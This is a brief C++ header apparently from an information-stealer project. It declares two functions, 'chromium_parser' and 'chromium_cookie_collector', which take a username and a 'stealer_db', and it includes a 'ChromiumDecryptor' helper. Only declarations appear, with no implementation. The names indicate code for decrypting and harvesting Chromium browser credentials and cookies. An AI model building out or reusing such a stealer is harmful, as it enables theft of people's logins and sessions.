#ifndef CHROMIUMPARSER_H
#define CHROMIUMPARSER_H

#include "includes\DataHolder.h"
#include "includes\DataDump.h"
#include "includes\ChromiumDecryptor.h"
#include "includes\Helper.h"

BOOL chromium_parser(std::string username, std::string stealer_db);
BOOL chromium_cookie_collector(std::string username, std::string stealer_db);

#endif /* CHROMIUMPARSER_H */
